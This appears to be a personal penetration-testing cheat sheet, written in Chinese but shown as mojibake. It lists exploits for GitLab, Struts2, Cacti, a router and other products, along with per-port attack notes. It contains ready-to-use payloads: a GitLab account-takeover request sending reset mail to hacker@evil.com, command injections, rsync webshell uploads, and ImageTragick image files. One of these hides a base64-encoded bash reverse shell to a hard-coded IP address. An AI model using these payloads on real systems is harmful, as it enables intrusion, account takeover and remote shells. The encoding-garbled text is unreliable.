  [gitlabæœªæˆæƒRCEï¼ˆCVE-2021-22205ï¼‰æ¼æ´å¤ç°åŠæ·±å…¥åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°](https://www.anquanke.com/post/id/259862#h2-0)

- ä¿¡æ¯æ³„æ¼ï¼ˆé¸¡è‚‹ï¼‰

  ```http
  POST /api/graphql
  
  # ç”¨æˆ·å
  {"query":"{users{edges{node{username,email}}}}"}
  
  # ç”¨æˆ·åï¼Œé‚®ç®±ï¼Œå¤´åƒä¿¡æ¯
  {"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
  ```

- ä»»æ„ç”¨æˆ·æ¥ç®¡æ¼æ´--CVE-2023-7028

  GitLabåœ¨é‡ç½®å¯†ç æ—¶ï¼Œå¯ä»¥ä¼ å…¥æ•°ç»„ä½œä¸ºemailï¼Œæ”»å‡»è€…å°†è‡ªå·±çš„é‚®ç®±åŠ å…¥æ•°ç»„ä¸­ï¼Œå¯ä»¥è®©GitLabåœ¨é‡ç½®å¯†ç æ—¶å°†é‚®ä»¶å‘ç»™æ•°ç»„é‡Œçš„æ‰€æœ‰ç”¨æˆ·ã€‚

  ```
  user[email][]=my.target@example.com&user[email][]=hacker@evil.com
  ```

  



### Gitblit

![image-20230922191132957](../../../images/image-20230922191132957.png)

ä»£ç ä»“åº“å¯ä»¥ç›´æ¥`git clone`ã€‚ã€‚ã€‚

- Gitblit 1.9.3

  ç›®å½•éå†

  ```
  /resources//../WEB-INF/web.xml
  ```





### è‹¥ä¾

[è‹¥ä¾æ¼æ´ | Khaz (fgtbnc.github.io)](https://fgtbnc.github.io/2023/06/21/è‹¥ä¾æ¼æ´å¤ç°/)

é‡åˆ°çš„é—®é¢˜

- ç”¨æˆ·å‡­è¯ï¼ˆå·¥å…·æ˜¯cookieï¼Œä½†æ˜¯é‡åˆ°çš„å¾ˆå¤šéƒ½æ˜¯JWTçš„ï¼‰
- å®šæ—¶ä»»åŠ¡å¤„çš„è¿‡æ»¤



### Phpstudy

æŒ‡çº¹

```http
responseçš„Serverï¼šServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
```

é›†æˆç¯å¢ƒ

```
nginxè§£ææ¼æ´
phpmyadminç›®å½•
```

[ã€æ¼æ´å¤ç°ã€‘phpStudy å°çš® Windowsé¢æ¿ RCEæ¼æ´_phpstudy æ¼æ´_æç«ç«å®‰å…¨é˜çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/weixin_46944519/article/details/128954060)



### shiro

[shiroæ¼æ´ | Khaz (fgtbnc.github.io)](https://fgtbnc.github.io/2023/05/01/shiroæ¼æ´/)



### æµ·åº·å¨è§†  

ã€æ¼æ´æ€»ç»“ã€‘æµ·åº·å¨è§†å…«å¤§æ¼æ´æ±‡æ€»
https://mp.weixin.qq.com/s/khra2Z6U57kktxGooUEu-A

- **æµ·åº·å¨è§†IP Camera**

  ![image-20240204153336070](../../../images/image-20240204153336070.png)

- Isecure Centerç»¼åˆå®‰é˜²ç®¡ç†å¹³å°ä»»æ„æ–‡ä»¶ä¸Šä¼ 

  ![iSecure-Center](../../../images/iSecure-Center.png)

- iVMS-5000,iVMS-8700ä»»æ„æ–‡ä»¶ä¸Šä¼ 

  ![image-20230826111722216](../../../images/image-20230826111722216.png)

  

### Jenkins

https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/



### Struct2

`OGNL`è¡¨è¾¾å¼æ³¨å…¥

```
# å…³é”®å‡½æ•°
Ognl.getValue()
```

æµ‹è¯•OGNLè¡¨è¾¾å¼`${233*233}`ï¼Œå¦‚æœé¡µé¢å›æ˜¾`233*233`çš„ç»“æœï¼Œåˆ™å­˜åœ¨OGNLè¡¨è¾¾å¼è§£æã€‚

| æ¼æ´åç§° |                     æ³¨å…¥ç‚¹                     |            å½±å“ç‰ˆæœ¬            |
| :------: | :--------------------------------------------: | :----------------------------: |
|  S2-061  |                                                |        2.0.0 -  2.5.25         |
|  S2-045  |                  Content-Type                  | 2.3.5 - 2.3.31ï¼Œ 2.5 -  2.5.10 |
|  S2-046  | æ–‡ä»¶ä¸Šä¼ çš„filenameå€¼ä½ç½®ï¼Œå¹¶éœ€è¦ä½¿ç”¨`\x00`æˆªæ–­ | 2.3.5 - 2.3.31ï¼Œ 2.5 -  2.5.10 |

```
S2-005
S2-008
S2-009
S2-013
S2-016(å®é™…ä¸Š,å¾ˆå¤šéƒ½è€ç³»ç»Ÿéƒ½æ¼è¡¥äº†è¿™ä¸ªæ´,æˆåŠŸç‡è¾ƒé«˜)
S2-019
S2-020
S2-devmode
S2-032
S2-033
S2-037
S2-045
S2-046
S2-048
S2-052
S2-053
S2-057
```





### JBOSS

> JBossæ˜¯ä¸€ä¸ªåŸºäºJ2EEçš„å¼€å‘æºä»£ç çš„åº”ç”¨æœåŠ¡å™¨ã€‚JBossä»£ç éµå¾ªLGPLè®¸å¯ï¼Œå¯ä»¥åœ¨ä»»ä½•å•†ä¸šåº”ç”¨ä¸­å…è´¹ä½¿ç”¨ã€‚JBossæ˜¯ä¸€ä¸ªç®¡ç†EJBçš„å®¹å™¨å’ŒæœåŠ¡å™¨ï¼Œæ”¯æŒEJB1.1ã€EJB2.0å’ŒEJB3çš„è§„èŒƒã€‚ä½†JBossæ ¸å¿ƒæœåŠ¡ä¸åŒ…æ‹¬æ”¯æŒservlet/JSPçš„WEBå®¹å™¨ï¼Œ**ä¸€èˆ¬ä¸Tomcatæˆ– Jettyç»‘å®šä½¿ç”¨**ã€‚

[å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-Jbossæ¸—é€åˆé›†](https://forum.butian.net/share/504)

![image-20230830142620222](../../../images/image-20230830142620222.png)

![image-20230830142653114](../../../images/image-20230830142653114.png)





### typecho

![image-20241020212718091](..\..\source\images\image-20241020212718091.png)

åå°è·¯å¾„https://www.03sec.com/Reprinted/typechoxiu-gai-hou-tai-lu-jing-liu-xia-de-lou-dong.html

åå°ä¿®æ”¹æ–‡ç« phpæ–‡ä»¶ç›´æ¥getshell

Typechoååºåˆ—åŒ–æ¼æ´åˆ†æ https://xz.aliyun.com/t/9428





# ç«¯å£æ¸—é€

![beepress-image-187604-1663914501 (1)](../../../images/beepress-image-187604-1663914501.png)





## åè®®ç±»

### FTP-20/21

**ä»‹ç»**

åº”ç”¨å±‚åè®®ï¼Œç”¨äºæ–‡ä»¶ä¼ è¾“

- ç«¯å£21

  ç”¨äºFTPçš„**æ§åˆ¶è¿æ¥**ï¼Œç”¨äºå»ºç«‹å’Œç»´æŠ¤FTPä¼šè¯ã€‚å®¢æˆ·ç«¯é€šè¿‡è¯¥ç«¯å£ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œå‘é€å‘½ä»¤å’Œæ¥æ”¶å“åº”ã€‚

- ç«¯å£20

  ç”¨äºFTPçš„**æ•°æ®è¿æ¥**ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚ä¾‹å¦‚ï¼Œå½“éœ€è¦ä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œæ•°æ®å°†é€šè¿‡ç«¯å£20è¿›è¡Œä¼ è¾“ã€‚

**å­˜åœ¨çš„é£é™©**

- anonymousåŒ¿åè®¿é—®ï¼Œå¼±å£ä»¤ï¼Œä»è€Œå¯ä»¥ä»»æ„è®¿é—®æ–‡ä»¶



### SSH-22

**ä»‹ç»**

ç”¨äºè¿æ¥è¿œç¨‹æœåŠ¡å™¨ï¼Œä½¿ç”¨å…¬é’¥ç®—æ³•è¿›è¡Œé€šä¿¡

**å­˜åœ¨çš„é£é™©**

- ä¸Šä¼ å…¬é’¥getshell
- å¼±å£ä»¤getshell
- sshåé—¨æƒé™ç»´æŒ



### Telent-23

**ä»‹ç»**

è·Ÿsshä½œç”¨ç›¸åŒï¼Œä½†æ˜¯æ˜¯æ˜æ–‡é€šä¿¡å¾ˆä¸å®‰å…¨ï¼Œå·²è¢«sshä»£æ›¿

**å­˜åœ¨çš„é£é™©**

- ç½‘ç»œå—…æ¢ï¼Œè·å–æ•æ„Ÿä¿¡æ¯
- åˆ¤æ–­TCPåè®®æ˜¯å¦å‡ºç½‘



### SMTP/SMTPS-25/465

**ä»‹ç»**

åº”ç”¨å±‚åè®®ï¼Œç”¨äºé‚®ä»¶çš„å‘é€

**å­˜åœ¨çš„é£é™©**

- æœªæˆæƒè®¿é—®/å¼±å£ä»¤ï¼Œä»è€Œå¯ä»¥å‘é€é’“é±¼é‚®ä»¶



### DNS-53

**ä»‹ç»**

åº”ç”¨å±‚åè®®ï¼Œç”¨äºå°†åŸŸåè§£æä¸ºIPåœ°å€æˆ–è€…è¿›è¡Œåå‘è§£æã€‚

**å­˜åœ¨çš„é£é™©**

- DNSæ¬ºéª—
- DNSç¼“å­˜æŠ•æ¯’
- æ‹’ç»æœåŠ¡æ”»å‡»
- åŸŸä¼ é€



### POP3-110

**ä»‹ç»**

åº”ç”¨å±‚åè®®ï¼Œç”¨äºä»é‚®ä»¶æœåŠ¡å™¨ä¸Šä¸‹è½½ç”µå­é‚®ä»¶åˆ°æœ¬åœ°å®¢æˆ·ç«¯ã€‚

**å­˜åœ¨çš„é£é™©**

- æ˜æ–‡ä¼ è¾“
- é‚®ä»¶åŠ«æŒ



### IMAP-143

**ä»‹ç»**

åº”ç”¨å±‚åè®®ï¼Œå…è®¸ç”¨æˆ·åœ¨é‚®ä»¶æœåŠ¡å™¨ä¸Šç®¡ç†å’Œæ£€ç´¢ç”µå­é‚®ä»¶ã€‚

**å­˜åœ¨çš„é£é™©**

åŒPOP3







### Rsync-893

**ä»‹ç»**

`Rsync`æ˜¯`Linux`ä¸‹çš„ä¸€æ¬¾æ•°æ®å¤‡ä»½å·¥å…·ï¼Œæ”¯æŒé€šè¿‡`rsync`åè®®ã€`ssh`åè®®è¿›è¡Œè¿œç¨‹æ–‡ä»¶ä¼ è¾“ï¼ˆä½†ä¸æ”¯æŒä¸¤å°è¿œç¨‹è®¡ç®—æœºä¹‹é—´çš„åŒæ­¥ï¼‰ã€‚å¸¸è¢«ç”¨äºåœ¨å†…ç½‘è¿›è¡Œæºä»£ç çš„åˆ†å‘åŠåŒæ­¥æ›´æ–°ï¼Œå› æ­¤ä½¿ç”¨äººç¾¤å¤šä¸ºå¼€å‘äººå‘˜ã€‚

**å­˜åœ¨çš„é£é™©**

å…¶ä¸­`rsync`åè®®é»˜è®¤ç›‘å¬`873`ç«¯å£ï¼Œè€Œä¸€èˆ¬å¼€å‘äººå‘˜å®‰å…¨æ„è¯†è–„å¼±çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç›®æ ‡å¼€å¯äº†`rsync`æœåŠ¡ï¼Œå¹¶ä¸”æ²¡æœ‰é…ç½®`ACL`æˆ–è®¿é—®å¯†ç ï¼Œæˆ‘ä»¬å°†å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨æ–‡ä»¶ã€‚

- æŸ¥çœ‹ rsync å®ˆæŠ¤ç¨‹åºåˆ†é…çš„æ‰€æœ‰ module åˆ—è¡¨

  ```shell
  rsync rsync://IP:873
  ```

- ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½•åˆ°æœ¬åœ°

  ```
  rsync -avz ip://xxx/secret /root/secret
  ```

- ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨

  ```
  rsync -avz webshell.php ip://web/
  ```

**ä¿®å¤**

rsyncé»˜è®¤çš„é…ç½®æ–‡ä»¶`/etc/rsyncd.conf`

```
motd file -> motdæ–‡ä»¶ä½ç½®
log file -> æ—¥å¿—æ–‡ä»¶ä½ç½®
path -> é»˜è®¤è·¯å¾„ä½ç½®
use chroot -> æ˜¯å¦é™å®šåœ¨è¯¥ç›®å½•ä¸‹ï¼Œé»˜è®¤ä¸ºtrueï¼Œå½“æœ‰è½¯è¿æ¥æ—¶ï¼Œéœ€è¦æ”¹ä¸ºfasle,å¦‚æœä¸ºtrueå°±é™å®šä¸ºæ¨¡å—é»˜è®¤ç›®å½•
read only -> åªè¯»é…ç½®ï¼ˆyes or noï¼‰
list=true -> æ˜¯å¦å¯ä»¥åˆ—å‡ºæ¨¡å—å
uid = root -> ä¼ è¾“ä½¿ç”¨çš„ç”¨æˆ·å
gid = root -> ä¼ è¾“ä½¿ç”¨çš„ç”¨æˆ·ç»„
auth users -> è®¤è¯ç”¨æˆ·å
secrets file=/etc/rsyncd.passwd -> æŒ‡å®šå¯†ç æ–‡ä»¶ï¼Œå¦‚æœè®¾å®šéªŒè¯ç”¨æˆ·ï¼Œè¿™ä¸€é¡¹å¿…é¡»è®¾ç½®ï¼Œè®¾å®šå¯†ç æƒé™ä¸º400,å¯†ç æ–‡ä»¶/etc/rsyncd.passwdçš„å†…å®¹æ ¼å¼ä¸ºï¼šusername:password
hosts allow=192.168.0.101  -> è®¾ç½®å¯ä»¥å…è®¸è®¿é—®çš„ä¸»æœºï¼Œå¯ä»¥æ˜¯ç½‘æ®µï¼Œå¤šä¸ªIpåœ°å€ç”¨ç©ºæ ¼éš”å¼€
hosts deny ç¦æ­¢çš„ä¸»æœºï¼Œhostçš„ä¸¤é¡¹å¯ä»¥ä½¿ç”¨*è¡¨ä»»æ„ã€‚
```



### SMB-445/139

SMBï¼ˆServer Message Blockï¼‰æœåŠ¡æ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼Œä¸»è¦ç”¨äºå±€åŸŸç½‘å†…çš„æ–‡ä»¶å…±äº«ã€æ‰“å°æœºå…±äº«å’Œå…¶ä»–ç½‘ç»œèµ„æºçš„è®¿é—®ã€‚SMBåè®®å¹¿æ³›ç”¨äºWindowsæ“ä½œç³»ç»Ÿï¼Œä½†ç°åœ¨ä¹Ÿæ”¯æŒLinuxå’ŒmacOSã€‚

åŸºæœ¬æ“ä½œ

```shell
smbclient -L Host -N  // åŒ¿åè®¿é—®
smbclient //192.168.1.100/shared -U username  // æŒ‡å®šç”¨æˆ·ç™»å½•
smbclient //192.168.1.100/shared -U DOMAIN/username // åŸŸè®¤è¯ç™»å½•
```

```shell
// éäº¤äº’æ¨¡å¼
smbclient //192.168.1.100/shared -U username -c "command"

// äº¤äº’æ¨¡å¼
ls // åˆ—æ–‡ä»¶
get "filename" //ä¸‹è½½æ–‡ä»¶
put localfile remotefile // ä¸Šä¼ æ–‡ä»¶
mkdir dirname // åˆ›å»ºç›®å½•
del filename // åˆ é™¤æ–‡ä»¶
exit // é€€å‡º
```

![image-20241120201707318](../..\source\images\image-20241120201707318.png)

- CVE-2020-0796 SMBGhost





### WinRM-5985/5986

**WinRMï¼ˆWindowsè¿œç¨‹ç®¡ç†ï¼‰** æ˜¯ä¸€ç§Windowsæ“ä½œç³»ç»Ÿä¸­çš„åè®®å’ŒæœåŠ¡ï¼ŒåŸºäº **WS-Managementï¼ˆWebæœåŠ¡ç®¡ç†åè®®ï¼‰** æ ‡å‡†ã€‚å®ƒç”¨äºé€šè¿‡HTTPæˆ–HTTPSè¿›è¡Œè¿œç¨‹ç®¡ç†å’Œç³»ç»Ÿé…ç½®ã€‚





## æ•°æ®åº“ç±»

### MSSQL-1433

å…³ç³»å‹æ•°æ®åº“

### Oracle-1521

### Mysql-3306

### PostgreSQL-5432

### Reidis-6379

### MongoDB-27017

éå…³ç³»å‹æ•°æ®åº“

- å¼±å£ä»¤
- æœªæˆæƒè®¿é—®
- NoSqlæ³¨å…¥



### Access-æ— ç«¯å£å·

Accessæ•°æ®åº“å±äºæ–‡ä»¶å‹æ•°æ®åº“ï¼Œæ‰€ä»¥ä¸éœ€è¦ç«¯å£å·ã€‚

åœ¨Office 2007ä¹‹å‰çš„Accessæ•°æ®åº“æ–‡ä»¶çš„åç¼€æ˜¯ .mdb ï¼ŒOffice2007åŠå…¶ä¹‹åçš„Accessæ•°æ®åº“æ–‡ä»¶çš„åç¼€æ˜¯ .accdb 



## WebæœåŠ¡ç±»

### Weblogic-7001

### JBOSS-8080

### Jenkis-8080

![image-20230925173219085](../../../images/image-20230925173219085.png)

![image-20230925173151794](../../../images/image-20230925173151794.png)

### Zabbix-10051

> zabbixæ˜¯ä¸€æ¬¾æœåŠ¡å™¨ç›‘æ§è½¯ä»¶ï¼Œé»˜è®¤æœåŠ¡å¼€æ”¾ç«¯å£ä¸º10051ï¼Œå…¶ç”±serverã€agentã€webç­‰æ¨¡å—ç»„æˆï¼Œå…¶ä¸­**webæ¨¡å—ç”±PHPç¼–å†™**ï¼Œç”¨æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„ç»“æœã€‚

[Zabbix æ”»å‡»é¢æŒ–æ˜ä¸åˆ©ç”¨ (seebug.org)](https://paper.seebug.org/1697/#zabbix-agent)

æœªæˆæƒè®¿é—®

```
/zabbix.php?action=problem.view&ddreset=1
/overview.php?ddreset=1
/srv_status.php?ddreset=1
/latest.php?ddreset=1
```

[bylibrary/docs/æ¼æ´åº“/01-CMSæ¼æ´/zabbix at main Â· BaizeSec/bylibrary (github.com)](https://github.com/BaizeSec/bylibrary/tree/main/docs/æ¼æ´åº“/01-CMSæ¼æ´/zabbix)

- sqlæ³¨å…¥
- åå°åˆ›å»ºè„šæœ¬getshell

[CVE-2022-23131ï¼šZabbix SSOè®¤è¯ç»•è¿‡æ¼æ´ - SecPulse.COM | å®‰å…¨è„‰æ](https://www.secpulse.com/archives/179601.html)

[CVE-2020-11800 zabbix RCEæ¼æ´ç»†èŠ‚æŠ«éœ² - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/8991)

- è¿›å…¥åå°å¯è‡ªåŠ¨æ³¨å†ŒåŠŸèƒ½

- expè·å–serverç«¯ï¼ˆexpéœ€è¦åœ¨zabbixæ‰€åœ¨çš„æœåŠ¡å™¨ä¸Šè¿è¡Œï¼‰

  ```
  python exp.py 127.0.0.1 cmd
  ```

  

### å®å¡”-8888

```
/pma
```

### Solr-8983

```
/solr/admin
```

[Apache Solr <= 8.8.1ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)](https://cloud.tencent.com/developer/article/1812009)



### Docker-Remote-API-2375

[Docker è¿œç¨‹ API æœªæˆæƒè®¿é—®é€ƒé€¸ | T Wiki (teamssix.com)](https://wiki.teamssix.com/cloudnative/docker/docker-remote-api-unauth-escape.html)

### Docker Registry-5000

### RabbitMQ-15672ã€15692ã€25672

å¼±å£ä»¤guset/guest



## è¿œç¨‹æ¡Œé¢

### RDP-3389





# è®¾å¤‡

![image-20241122232431014](C:\Users\yanzu\AppData\Roaming\Typora\typora-user-images\image-20241122232431014.png)

## Vmware

W01fh4cker/ScreenConnect-AuthBypass-RCE: ScreenConnect AuthBypass(cve-2024-1709) --> RCE!!!
https://github.com/W01fh4cker/ScreenConnect-AuthBypass-RCE





## è·¯ç”±å™¨

## é£æ˜Ÿé±¼è·¯ç”±å™¨

```http
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
{"opid":"1","name":";id;","type":"rest"}
```



## cacti

> cactiæ˜¯ä¸€å¥—åŸºäºPHP,MySQL,SNMPåŠRRDToolå¼€å‘çš„ç½‘ç»œæµé‡ç›‘æµ‹å›¾å½¢åˆ†æå·¥å…·

![image-20231229173014673](../../../images/image-20231229173014673.png)

CVE-2022-46169

```http
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`ping%20e2y29y.dnslog.cn`

X-Forwarded-For: 127.0.0.1
```

Unauthenticated SQL Injection when viewing graphs Â· Advisory Â· Cacti/cacti
https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg

CVE-2020-8813-Cacti-v1.2.8-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ - Cacti
https://www.hacking8.com/bug-product/Cacti/CVE-2020-8813-Cacti-v1.2.8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html

æ¼æ´é¢„è­¦ | Cactiæ–‡ä»¶åŒ…å«å’ŒSQLæ³¨å…¥æ¼æ´ | CN-SEC ä¸­æ–‡ç½‘
https://cn-sec.com/archives/2342658.html





# ç»„ä»¶

## Imagetragick 

### åŸç†

ImageMagickæœ‰ä¸€ä¸ªåŠŸèƒ½å«åšdelegateï¼ˆå§”æ‰˜ï¼‰ï¼Œä½œç”¨æ˜¯è°ƒç”¨å¤–éƒ¨çš„libæ¥å¤„ç†æ–‡ä»¶ã€‚è€Œè°ƒç”¨å¤–éƒ¨libçš„è¿‡ç¨‹æ˜¯ä½¿ç”¨ç³»ç»Ÿçš„systemå‘½ä»¤æ¥æ‰§è¡Œï¼Œæ¼æ´å‘ç”Ÿçš„åœ°æ–¹ï¼š

```shell
<delegate decode="https" command="&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;"/>
```

å®ƒåœ¨è§£æhttpså›¾ç‰‡çš„æ—¶å€™ï¼Œä½¿ç”¨äº†curlå‘½ä»¤å°†å…¶ä¸‹è½½ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€äº›å ä½ç¬¦ï¼Œå¦‚%oæ˜¯curlè¾“å‡ºçš„æ–‡ä»¶åï¼Œ%Mæ˜¯è¿œç¨‹çš„URLè·¯å¾„ã€‚æ³¨æ„åˆ°commandä¸­çš„å¯ä»¥åˆ°%Mæ˜¯å¯ä»¥æ‹¼æ¥å…¶ä»–æŒ‡ä»¤å¹¶è¢«åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œçš„ã€‚è¯¥æ¼æ´ä¹Ÿå› æ­¤è€Œæ¥ï¼Œè¢«æ‹¼æ¥å®Œæ¯•çš„å‘½ä»¤è¡Œä¼ å…¥äº†ç³»ç»Ÿçš„systemå‡½æ•°ï¼Œè€Œæˆ‘ä»¬åªéœ€ä½¿ç”¨åå¼•å·ï¼ˆ`ï¼‰æˆ–é—­åˆåŒå¼•å·ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™æ ·ï¼š

```shell
command=" "curl" -s -k -o "%o" "https:%M" "/>
```

å½“%Mä¸ºï¼šhttps://"|id && ls -al /etc/passwd"

```shell
command=" "curl" -s -k -o "%o" "https://"|id && ls -al /etc/passwd"" "/>
```

### payload

ä¸Šä¼ çš„å›¾ç‰‡å†…å®¹

- **CVE-2016-3714**--**å‘½ä»¤æ‰§è¡Œ**

  ```shell
  # httpè¯·æ±‚
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.0/oops.jpg"|curl "www.leavesongs.com:8889)'
  pop graphic-context
  
  # åå¼¹shell
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`"||id " )'
  pop graphic-context
  ```

- **CVE-2016-3715**--**ä»»æ„åˆ é™¤æ–‡ä»¶**

  ```shell
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
  pop graphic-context
  ```

- **CVE-2016-3716**--**ä»»æ„æ–‡ä»¶å†™å…¥**

  > mslåè®®æ˜¯è¯»å–ä¸€ä¸ªmslæ ¼å¼çš„xmlæ–‡ä»¶ï¼Œå¹¶æ ¹æ®å…¶å†…å®¹æ‰§è¡Œä¸€äº›æ“ä½œ

  ```shell
  å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬1.pngå’Œmsl.xml
  # msl.xmlå†…å®¹ï¼Œ1.pngé‡å‘½åä¸ºshell.php
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
  <read filename="1.png" />
  <write filename="shell.php" />
  </image>
  
  å†ä¸Šä¼ expå›¾ç‰‡
  -=-=-=-=-=-=-=-=-
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'msl:msl.xml'
  pop graphic-context
  ```

- CVE-2016-3717--ä»»æ„æ–‡ä»¶è¯»å–

  ```php
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'label:@/etc/hosts'
  pop graphic-context$ convert file_read.mvg out.png # produces file with text rendered from/etc/passwd
  ```

  

  

  

  

  

  

  

â€‹	



